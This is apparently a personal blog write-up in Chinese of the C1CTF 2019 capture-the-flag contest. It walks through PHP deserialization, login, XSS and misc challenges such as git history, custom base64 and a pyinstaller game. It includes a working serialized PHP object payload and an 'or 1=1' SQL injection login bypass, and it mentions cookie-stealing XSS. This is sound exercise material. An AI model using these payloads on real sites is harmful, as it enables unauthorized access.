---
title: C1CTF Writeup
categories:
  - 比赛Writeup
tags:
  - ctf
  - Writeup
index_img: /img/used/comp.jpg
date: 2019-12-10 16:32:29

---

# C1CTF Writeup

首先是Web部分

## Paradox

用到的知识点都不难，分别是MD5数组绕过、php伪协议和弱类型比较。就当巩固基础了，但发现了一个做题的小技巧，在这里总结一下。

做这种审计题，最好的办法就是本地搭建环境模拟。这样既可以进行一些php的序列化操作，又可以看到输入的变量，比较清晰。演示一下：  

首先部署docker环境，命令如下：

```bash
docker run --name lampTest -p 8088:80 --volume `pwd`/public_html:/var/www/example.com/public_html/ -i -t linode/lamp /bin/bash
```

这是把所在目录下的`publim_html`目录绑定到docker容器中对应的目录，就可以在外部修改网页了。之后按照题目要求，添加`index.php`和`flag.php`。

```php
<?php
//index.php
include 'flag.php';

Class Paradox {
    public $flag;
    public $filename;
    public $noncea;
    public $nonceb;

    function paradox_one() {
        if ($this->noncea != $this->nonceb && md5($this->noncea) == md5($this->nonceb)) {
            return true;
        } else {
            echo "Failed in paradox_one";
            return false;
        }
    }
    function paradox_two() {
        if (file_get_contents($this->filename) == 'welcome_to_c1ctf') {
            return true;
        } else {
            echo "Failed in paradox_two";
            return false;
        }
    }
    function paradox_three() {
        var_dump(0 == "C1CTF{}");//True
        global $flag;
        if ($this->flag == $flag) {
            return true;
        } else {
            echo "Failed in paradox_three";
            return false;
        }
    }

    function __destruct() {
        global $flag;
        if ($this->paradox_one() && $this->paradox_two() && $this->paradox_three()) {
            echo "You solved all paradox! Here is your flag<br>";
            echo $flag;
        }
    }
}

/*
  这些是测试用的
*/
$sample_ans = new Paradox();
$sample_ans->noncea = array();
$sample_ans->nonceb = array("1"=>"2");
$sample_ans->filename = "data:text/plain,welcome_to_c1ctf";
$sample_ans->flag = 0;
$s = serialize($sample_ans);
echo $s;

if (isset($_REQUEST['answer'])) {
    unserialize($_REQUEST['answer']);
} else {
    highlight_file(__FILE__);}
?>
```

```php
<?php
echo "flag.php included.";
global $flag;
$flag = "C1CTF{This_Is_a_Sample_Flag}";
?>
```

如index.php最后几行中，进行了对象满足条件与否的测试，对象`$sample_ans`已经满足题目要求了。  

![](https://upload-images.jianshu.io/upload_images/19782504-599c056e0b57ccf4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

接下来序列化即可，然后传入answer参数中。

![](https://upload-images.jianshu.io/upload_images/19782504-be244bb145d1da95.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

最后的payload为

```
?answer=O:7:"Paradox":4:{s:4:"flag";i:0;s:8:"filename";s:32:"data:text/plain,welcome_to_c1ctf";s:6:"noncea";a:0:{}s:6:"nonceb";a:1:{i:1;s:1:"2";}}
```

在真实网站提交即可。  

`C1CTF{d0_th3_imp0ssibl3_see_7he_1nv1s1bl3}`

## login

![](https://upload-images.jianshu.io/upload_images/19782504-a3ed52c720ba7204.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

然而这种事情是真实发生的，我还能说什么呢？  

`C1CTF{1ns3cure_htm1_n0sql}`

## LoginV2

一个admin' or 1=1#就过了，我还能说什么呢？  

```
C1CTF{eZ_my3ql_inj3ct_with_'0r_1=1#}
```

## Pastebin

简单XSS，接收cookie即可

---

然后是Misc部分

## ez_github

给了一个git仓库，只有一个flag.txt，发现了很多分支和commit，自然要查看一下历史版本中有没有什么信息了。查看了几个发现格式很一致，都是`字符----数字`的格式。使用命令`git rev-list --all | xargs git grep "-" > out.txt`将历史版本中，含有-的输出到out.txt中，文件大概这样：

```
c769ffec48a03185a32c3af1b4f4c06476d4f787:flag.txt:5----127
14bc3c9cff8c980294b9189d18c63397b4239581:flag.txt:A----126
be5225cc40b0e1de8b943a030645ed2e493a864f:flag.txt:D----125

...

cad350b221f4698b9629c1f2a95a07567070efce:flag.txt:o----3
1cdaadd164b9e00d78767882317728624a05ce63:flag.txt:Z----2
53e40b7d21168c372111a4dcb3fae9e76f125d77:flag.txt:l----1
479b628a952a6938e5a234bfa4d7863db42c2ccf:flag.txt:V----0
```

自然想到按照字母排序，脚本如下  

```python
#solve.py
data = ""
with open("out.txt") as f:
    for line in f:
        data += line.split(":")[-1]

ndata = ""
for line in data.split("\n"):
    if len(line) > 0:
        ndata+=line[0]

print(ndata[::-1])
```

```bash
$ python3 solve.py 
VlZod1IxSkdXa1pYYW1SUVZqQnNOVlJzVWtOaVZUUjVWMWhrVDFKR1duTlVXSEJhWlVVeFNGTlVTazVpVm10M1ZHNXdWMkpHY0ZWV1ZFcFBaV3N3ZDFkWE1VZFBVVDA5
```

看起来像是base64的亚子，四次b64decode得到flag。

```python
>>> a=VlZod1IxSkdXa1pYYW1SUVZqQnNOVlJzVWtOaVZUUjVWMWhrVDFKR1duTlVXSEJhWlVVeFNGTlVTazVpVm10M1ZHNXdWMkpHY0ZWV1ZFcFBaV3N3ZDFkWE1VZFBVVDA5
>>> base64.b64decode( base64.b64decode( base64.b64decode( base64.b64decode(a))))
b'C1CTF{9b250f7f045e3610b62f475ee56734ba}'
```

## BabyBase64

盲猜Base64密码表的替换。编写脚本：

```python
import base64
import string

str1 = "Lt2ZR0M4AZBtMELuKt2tKwMvPdzzVA== "#解密

string1 = "C1sec20I9/iS+FUNABDEGHJKLMOPQRTVWXYZabdfghjklmnopqrtuvwxyz345678"#替换
string2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

print (base64.b64decode(str1.translate(str.maketrans(string1,string2))).decode())
```

`c1ctf{B4se64_1s_funny}`

## 2048

是一个pyinstaller生成的小游戏。用网上的 pyinstaller extractor进行提取。然后寻找flag...

```bash
raidriarb@Rmbp C1CTF_2048.exe_extracted % grep C1CTF *
grep: PYZ-00.pyz_extracted: Is a directory
Binary file puzzle matches
```

打开这个puzzle文件，这里只显示了一部分。出现了lost时的字符串`You Lost!`。看了是这个没错了，把这些奇怪的字符去掉试一试：

```
jdd    jdtjdçdS)Nr*zback on step total step:F⁄winrZC1CTF)r rz{2048rZ_1s_Èzfun}ZloseZYouzLost!)⁄repr⁄charrZKEY_BACK⁄lenr1⁄popr/r⁄printrr
r2r%Z
```

`C1CTF{2048_1s_fun}`  

而且看起来玩到2048是真的可以给你flag的。。
